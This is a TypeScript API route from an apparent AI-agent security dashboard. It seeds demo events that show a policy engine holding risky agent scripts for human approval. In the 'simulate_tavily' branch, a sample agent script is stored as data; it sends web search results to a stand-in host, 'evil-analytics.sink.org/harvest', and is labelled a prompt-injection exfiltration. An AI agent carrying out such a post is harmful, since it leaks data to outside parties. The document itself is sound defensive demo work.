import { NextResponse } from 'next/server';
import { revalidatePath } from 'next/cache';
import { requireSession } from '@/lib/auth';
import { seedDemoSimulation, clearDemoData } from '@/lib/data';
import { getRedisClient, RedisKeys } from '@/lib/redis';

export async function POST(req: Request) {
  try {
    const session = await requireSession();

    const body = await req.json().catch(() => ({}));
    const action = body.action || 'simulate_attack';

    if (action === 'simulate_attack') {
      await seedDemoSimulation(session.orgId, session.email);
      revalidatePath('/app/approvals');
      revalidatePath('/app');
      revalidatePath('/app/audit');
      return NextResponse.json({
        success: true,
        message: 'Simulated prompt injection exfiltration attack held in approval queue.',
      });
    }

    if (action === 'simulate_benign') {
      const redis = getRedisClient();
      const today = new Date().toISOString().slice(0, 10).replace(/-/g, '');
      const budgetKey = `org:{${session.orgId}}:budget:agent-nemotron-super:${today}`;
      await redis.hincrby(budgetKey, 'calls', 1);

      const streamKey = RedisKeys.streamAudit(session.orgId);
      await redis.xadd(
        streamKey,
        '*',
        'id', `evt-${Date.now()}`,
        'timestamp', new Date().toISOString(),
        'orgId', session.orgId,
        'eventType', 'script.allowed',
        'agentId', 'agent-nemotron-super',
        'details', JSON.stringify({ tools: ['inbox.get_emails'], decision: 'allow', runtimeMs: 0.7 })
      );

      revalidatePath('/app');
      revalidatePath('/app/audit');
      return NextResponse.json({
        success: true,
        message: 'Simulated routine benign agent task completed cleanly.',
      });
    }

    if (action === 'simulate_tavily') {
      const redis = getRedisClient();
      let searchData: any = null;
      const query = (body.query && typeof body.query === 'string') ? body.query.slice(0, 100) : 'NVIDIA Nemotron LLM agent architecture';

      if (process.env.TAVILY_API_KEY && process.env.TAVILY_API_KEY.trim() !== '') {
        try {
          const resp = await fetch('https://api.tavily.com/search', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              Authorization: `Bearer ${process.env.TAVILY_API_KEY.trim()}`,
            },
            body: JSON.stringify({
              query,
              search_depth: 'basic',
              max_results: 3,
              include_answer: true,
            }),
          });
          if (resp.ok) {
            searchData = await resp.json();
          }
        } catch {
          // Fall back gracefully if outbound network is blocked
        }
      }

      if (!searchData) {
        searchData = {
          answer: 'NVIDIA Nemotron models provide high-accuracy agentic reasoning, code synthesis, and tool execution capabilities.',
          results: [
            {
              title: 'Nemotron-3 Agentic Reasoning Overview',
              url: 'https://developer.nvidia.com/nemotron',
              content: 'Architectural overview of NVIDIA Nemotron models optimized for tool calling and deterministic enterprise execution.',
            },
            {
              title: 'Tavily Search API for AI Agents',
              url: 'https://tavily.com',
              content: 'Search engine optimized for LLMs and autonomous agents with real-time fact retrieval.',
            },
          ],
        };
      }

      // Record held approval representing untrusted web data exfiltration
      const approvalId = 'appr-tavily-research';
      const approvalKey = RedisKeys.approval(session.orgId, approvalId);
      const now = new Date();
      const expiresAt = new Date(now.getTime() + 10 * 60 * 1000).toISOString();

      const approvalPayload = {
        id: approvalId,
        approvalId,
        orgId: session.orgId,
        agentId: 'agent-researcher-tavily',
        scriptHash: 'sha256_tavily_research_agent_exfil',
        code: `// Research Agent (Powered by Tavily)\n// Step 1: Real-time web intelligence query\nconst webIntel = await tools.tavily.web_search({\n  query: "${query}",\n  maxResults: 3\n});\n\n// Step 2: Untrusted web content injection exfiltrating to external sink\nawait tools.http.post({\n  url: "https://evil-analytics.sink.org/harvest",\n  body: { payload: webIntel }\n});`,
        intent: 'Conduct live web market intelligence research and sync external telemetry',
        explanation: 'Rule R1: Untrusted web data ingested via tavily.web_search flows to external destination (http.post)',
        reasons: [
          'Rule R1: Untrusted web data ingested via tavily.web_search flows to external destination (http.post)',
          'Data boundary violation: Untrusted web search payload passed to unauthenticated sink',
        ],
        flaggedFlows: ['reads_untrusted -> writes_external'],
        analysis: {
          valid: true,
          sha256: 'sha256_tavily_research_agent_exfil',
          calls: [
            { server: 'tavily', tool: 'web_search', line: 3, inLoop: false },
            { server: 'http', tool: 'post', line: 10, inLoop: false },
          ],
          uniqueToolKeys: ['tavily.web_search', 'http.post'],
          tags: ['reads_untrusted', 'writes_external'],
        },
        status: 'pending',
        policyVersion: 1,
        createdAt: now.toISOString(),
        expiresAt,
        simulation: true,
        source: 'tavily_research_agent',
      };

      await redis.set(approvalKey, JSON.stringify(approvalPayload));
      await redis.set(RedisKeys.approval(session.orgId, 'appr_tavily_research'), JSON.stringify(approvalPayload));

      // Audit stream entry
      const streamKey = RedisKeys.streamAudit(session.orgId);
      await redis.xadd(
        streamKey,
        '*',
        'id', `evt-${Date.now()}`,
        'timestamp', now.toISOString(),
        'orgId', session.orgId,
        'eventType', 'script.held',
        'agentId', 'agent-researcher-tavily',
        'details', JSON.stringify({
          provider: 'Tavily Search API',
          query,
          tools: ['tavily.web_search', 'http.post'],
          decision: 'hold',
          rule: 'R1 (reads_untrusted -> writes_external)',
          preview: searchData.results?.[0]?.title || 'Web Search Intelligence',
        })
      );

      revalidatePath('/app/approvals');
      revalidatePath('/app');
      revalidatePath('/app/audit');
      return NextResponse.json({
        success: true,
        message: 'Research Agent executed live Tavily web search. Exfiltration attempt held under Rule R1.',
        searchData,
      });
    }

    if (action === 'clear') {
      revalidatePath('/app/approvals');
      revalidatePath('/app');
      revalidatePath('/app/audit');
      // For demo sandboxes, full reset of demo data
      if (session.isDemo || session.orgId.startsWith('demo-')) {
        await clearDemoData(session.orgId);
        return NextResponse.json({
          success: true,
          message: 'Account data and history reset to clean initial state.',
        });
      }

      // For production accounts (main), clear only simulated test approvals while keeping audit logs immutable (F-06)
      const redis = getRedisClient();
      await redis.del(RedisKeys.approval(session.orgId, 'appr-demo-prompt-injection'));
      await redis.del(RedisKeys.approval(session.orgId, 'appr_demo_prompt_injection'));
      await redis.del(RedisKeys.approval(session.orgId, 'appr-tavily-research'));
      return NextResponse.json({
        success: true,
        message: 'Simulated test approvals cleared. Production audit logs preserved as immutable record.',
      });
    }

    return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Simulation failed' }, { status: 500 });
  }
}

